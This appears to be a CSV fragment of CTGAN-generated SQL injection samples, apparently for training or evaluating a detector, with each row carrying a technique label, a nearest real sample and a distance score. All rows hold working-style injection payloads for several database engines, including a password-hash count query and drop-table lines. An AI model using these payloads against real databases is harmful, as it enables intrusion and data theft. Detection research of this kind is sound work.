CTGAN_001327,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R002028,3.222896893352795
CTGAN_001328,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000330,4.602748555156574
CTGAN_001329,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R006203,6.479351791570695
CTGAN_001330,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R001937,3.2383775592330166
CTGAN_001331,attack,boolean,-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,nearest_attack_euclidean,R006433,2.7657656683228966
CTGAN_001332,attack,union," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000036,5.710592507055411
CTGAN_001333,attack,union,"-1432""   )    )    union all select 9008,9008,9008#",nearest_attack_euclidean,R005668,3.0245518181212336
CTGAN_001334,attack,time,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'svuu'  =  'svuu,nearest_attack_euclidean,R007262,3.1505862923573718
CTGAN_001335,attack,error,"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R005327,3.9319435870699513
CTGAN_001336,attack,other,1'   )    )    as vdhw where 8858  =  8858 order by 1#,nearest_attack_euclidean,R002323,3.8324216112735066
CTGAN_001337,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R001714,3.2763295612365506
CTGAN_001338,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R006692,2.5941520896025594
CTGAN_001339,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R002879,2.239171717909091
CTGAN_001340,attack,other,""" or """" """,nearest_attack_euclidean,R000286,7.884636910641972
CTGAN_001341,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R005810,4.114800181753884
CTGAN_001342,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R006315,4.057724887660322
CTGAN_001343,attack,boolean,"-1048%"" or 3038  =  3038",nearest_attack_euclidean,R002541,2.9640169742691755
CTGAN_001344,attack,boolean, or uid like '%,nearest_attack_euclidean,R000205,4.142266967163182
CTGAN_001345,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R007942,28.642401227101608
CTGAN_001346,attack,other,1'  )   where 3187  =  3187 order by 1#,nearest_attack_euclidean,R007984,3.620048702095053
CTGAN_001347,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R007900,2.757100234004099
CTGAN_001348,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000982,3.3322140716115554
CTGAN_001349,attack,boolean,"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,nearest_attack_euclidean,R008621,3.8192884157978777
CTGAN_001350,attack,error,"1%"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,nearest_attack_euclidean,R008882,3.644239160655888
CTGAN_001351,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R001098,4.191480462919433
CTGAN_001352,attack,boolean,"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002598,4.941879063844908
CTGAN_001353,attack,error,"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R003351,4.816226494581664
CTGAN_001354,attack,boolean,"-9854%""   )    )     )   or 6455  =  3652",nearest_attack_euclidean,R003604,3.4782326653849784
CTGAN_001355,attack,error,"-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg",nearest_attack_euclidean,R004885,4.795251723463197
CTGAN_001356,attack,other,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",nearest_attack_euclidean,R005541,3.3843341360191626
CTGAN_001357,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",nearest_attack_euclidean,R004419,2.896235630254729
CTGAN_001358,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.6444996454892813
CTGAN_001359,attack,time,select sleep  (  5  )   and    (    (   8679  =  8679,nearest_attack_euclidean,R004093,2.9725457535871653
CTGAN_001360,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,3.198079911978091
CTGAN_001361,attack,boolean,"1"" and elt  (  4249  =  4249,7259  )  ",nearest_attack_euclidean,R002655,2.1679129537224293
CTGAN_001362,attack,boolean,"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001047,5.455105875335116
CTGAN_001363,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R007433,1.5705573987751882
CTGAN_001364,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000246,4.054497011828868
CTGAN_001365,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,3.3275193276296045
CTGAN_001366,attack,boolean,"1%"" and 5411  =  7697 and ""%""  =  """,nearest_attack_euclidean,R002826,2.8533335384304332
CTGAN_001367,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,4.341203392479614
CTGAN_001368,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R001208,4.547061171150262
CTGAN_001369,attack,boolean,"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R007525,3.1929412850601784
CTGAN_001370,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R007942,25.15895497491519
CTGAN_001371,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,4.208518222184751
CTGAN_001372,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R006991,2.710796924220101
CTGAN_001373,attack,boolean,"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R008547,3.5599251018034446
CTGAN_001374,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R006769,6.42458808080366
CTGAN_001375,attack,other,end# ckxq,nearest_attack_euclidean,R003895,3.5791861757006678
CTGAN_001376,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001545,4.022226532093456
CTGAN_001377,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001414,3.818726339167635
CTGAN_001378,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R004533,1.3222346879831217
CTGAN_001379,attack,other,or,nearest_attack_euclidean,R000581,3.587704114673027
CTGAN_001380,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,6.651092989054607
CTGAN_001381,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R006221,5.2669674747475534
CTGAN_001382,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001267,3.9306751773768953
CTGAN_001383,attack,boolean,end and   (  'nchh'  =  'nchh,nearest_attack_euclidean,R002387,1.7223231348928376
CTGAN_001384,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R004810,3.0943258577260973
CTGAN_001385,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'beoh'  =  'beoh",nearest_attack_euclidean,R007829,3.817872419067792
CTGAN_001386,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cgbf' like 'cgbf",nearest_attack_euclidean,R001508,3.058515093687668
CTGAN_001387,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R007942,22.060492558188514
CTGAN_001388,attack,union,"-7016%""   )    )    union all select 8847,8847,8847--",nearest_attack_euclidean,R006874,6.330258643111914
CTGAN_001389,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '",nearest_attack_euclidean,R008081,4.057481983977796
CTGAN_001390,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R008171,3.482998316585748
CTGAN_001391,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.888994347980587
CTGAN_001392,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R004671,3.0556709321450732
CTGAN_001393,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R007952,5.306991244693235
CTGAN_001394,attack,other, (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R005753,4.390061603547172
CTGAN_001395,attack,other,select case when 6558  =  4327 then 1 else null end--,nearest_attack_euclidean,R000710,2.2194805322310884
CTGAN_001396,attack,boolean, or uname like '%,nearest_attack_euclidean,R000549,3.0512412079967524
CTGAN_001397,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R007699,4.06503783358143
CTGAN_001398,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R007122,3.4870738194476276
CTGAN_001399,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.152676824633953
CTGAN_001400,attack,boolean,"1%' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008051,3.841063537745792
CTGAN_001401,attack,error,"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R005615,25.300793716599486
CTGAN_001402,attack,other,"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002356,2.8128298192895373
CTGAN_001403,attack,time,select sleep  (  5  )   and    (    (   8679  =  8679,nearest_attack_euclidean,R004093,2.9469855433381533
CTGAN_001404,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",nearest_attack_euclidean,R007664,2.587173047453465
CTGAN_001405,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.248282223965667
CTGAN_001406,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,3.348353786677148
CTGAN_001407,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000332,3.703254959035642
CTGAN_001408,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R006614,3.9058028083838128
CTGAN_001409,attack,time,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R004230,3.595882517417354
CTGAN_001410,attack,other,1'   )    )    as eymg where 7000  =  7000,nearest_attack_euclidean,R000829,4.078510989061759
CTGAN_001411,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,5.501881590856717
CTGAN_001412,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R001102,6.889962992754364
CTGAN_001413,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R002402,4.640036281007849
CTGAN_001414,attack,boolean,"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R004599,3.939262073010208
CTGAN_001415,attack,boolean,-2495   )    )    as hudw where 4197  =  4197 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R004211,1.9811832195773926
CTGAN_001416,attack,other,"1',  (  case when 2872  =  2872 then 1 else null end  )  ",nearest_attack_euclidean,R008965,4.740191846071341
CTGAN_001417,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000504,6.368536197155078
CTGAN_001418,attack,other,1'  )   where 2928  =  2928,nearest_attack_euclidean,R001921,2.6480938814128314
CTGAN_001419,attack,error,"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R002078,6.022791866333401
CTGAN_001420,attack,other,"-6546""  )   order by 1#",nearest_attack_euclidean,R005467,4.511301222321985
CTGAN_001421,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R007900,3.1185196757898432
CTGAN_001422,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,3.646951702164232
CTGAN_001423,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx",nearest_attack_euclidean,R005073,2.5454963717064336
CTGAN_001424,attack,error,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""tlpw""  =  ""tlpw",nearest_attack_euclidean,R004438,3.3491597730828175
CTGAN_001425,attack,other,"1""   )    )    as chal where 6661  =  6661",nearest_attack_euclidean,R002111,1.41255889475594
CTGAN_001426,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R007115,2.7568039674933797
CTGAN_001427,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R004244,3.616475466316374
CTGAN_001428,attack,boolean,"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",nearest_attack_euclidean,R005757,4.299451541197075
CTGAN_001429,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R004533,2.0831567228482184
CTGAN_001430,attack,union,"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",nearest_attack_euclidean,R005522,3.8534323216343824
CTGAN_001431,attack,boolean,1%'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R006512,1.5696780657253115
CTGAN_001432,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",nearest_attack_euclidean,R000685,3.867768134291242
CTGAN_001433,attack,other," , drop table temp --",nearest_attack_euclidean,R000360,2.08853116005798
CTGAN_001434,attack,other,"make_set  (  6174  =  9734,1  )  ",nearest_attack_euclidean,R005136,2.476621113121686
CTGAN_001435,attack,other,admin' #,nearest_attack_euclidean,R000120,3.486142411193437
CTGAN_001436,attack,other,"1""   )    )    as chal where 6661  =  6661",nearest_attack_euclidean,R002111,1.756485560094455
CTGAN_001437,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   3508  =  3508",nearest_attack_euclidean,R006061,2.0976812185565654
CTGAN_001438,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,3.117535429411835
CTGAN_001439,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R001009,4.596173179090216
CTGAN_001440,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007603,3.0738816981954953
CTGAN_001441,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002256,5.094579669665896
CTGAN_001442,attack,boolean,"1""   )    )    and 9800  =  8713",nearest_attack_euclidean,R004293,3.9693475693094706
CTGAN_001443,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,3.0358819642700285
CTGAN_001444,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",nearest_attack_euclidean,R004387,3.3616013418877295
CTGAN_001445,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,3.7401576673176073
CTGAN_001446,attack,union,"1""   )    )     )   union all select null--",nearest_attack_euclidean,R007247,9.08217125291822
CTGAN_001447,attack,time,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",nearest_attack_euclidean,R003551,3.488527233713444
CTGAN_001448,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R006048,3.5248460613457233
CTGAN_001449,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",nearest_attack_euclidean,R001452,4.094397122770155
CTGAN_001450,attack,time," select sleep  (  5  )   and ""oivc"" like ""oivc",nearest_attack_euclidean,R004790,2.900520754270519
CTGAN_001451,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R001478,4.02827076778274
CTGAN_001452,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000385,8.78454948848292
CTGAN_001453,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,3.4066692396014138
CTGAN_001454,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R007153,5.4154787144240695
CTGAN_001455,attack,boolean,"1 and elt  (  8853  =  1675,1675  )  -- jegm",nearest_attack_euclidean,R004931,1.760484382516503
CTGAN_001456,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003725,4.5355786247985455
CTGAN_001457,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl",nearest_attack_euclidean,R004972,4.574262225054398
CTGAN_001458,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R005643,5.001420843963938
CTGAN_001459,attack,boolean,"1   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006523,2.9467770898640095
CTGAN_001460,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,4.5743090244472535
CTGAN_001461,attack,other,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R001634,3.860234673715012
CTGAN_001462,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R002977,3.3882028694326536
CTGAN_001463,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,4.470373569887094
CTGAN_001464,attack,time,1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R008699,3.4986762202928907
CTGAN_001465,attack,boolean,"-5417 or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R001865,1.9616612824594468
CTGAN_001466,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R004355,6.3795658469941126
CTGAN_001467,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000261,6.7419376745706066
CTGAN_001468,attack,union,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",nearest_attack_euclidean,R000708,3.281656950002918
CTGAN_001469,attack,time,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R003636,8.525631007329945
CTGAN_001470,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007887,7.870416551305876
CTGAN_001471,attack,error,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",nearest_attack_euclidean,R001259,5.124990420749237
CTGAN_001472,attack,time,select sleep  (  5  ) ,nearest_attack_euclidean,R003000,3.084190591402437
CTGAN_001473,attack,union,"1%"" union all select null,null,null,null#",nearest_attack_euclidean,R007612,3.883804866684735
CTGAN_001474,attack,other,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",nearest_attack_euclidean,R006805,7.160196229151513
CTGAN_001475,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R004957,4.747209012151886
CTGAN_001476,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R008823,4.004178040045003
CTGAN_001477,attack,time,select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,nearest_attack_euclidean,R006267,4.03561968804861
CTGAN_001478,attack,other,1  )   as nmlm where 9872  =  9872,nearest_attack_euclidean,R005215,1.6668539417190151
CTGAN_001479,attack,boolean,1' in boolean mode  )   and 5981  =  6700,nearest_attack_euclidean,R001589,2.2506556912059916
CTGAN_001480,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,1.604949580760304
CTGAN_001481,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R008013,3.56136090952741
CTGAN_001482,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,nearest_attack_euclidean,R004861,5.1122860802408
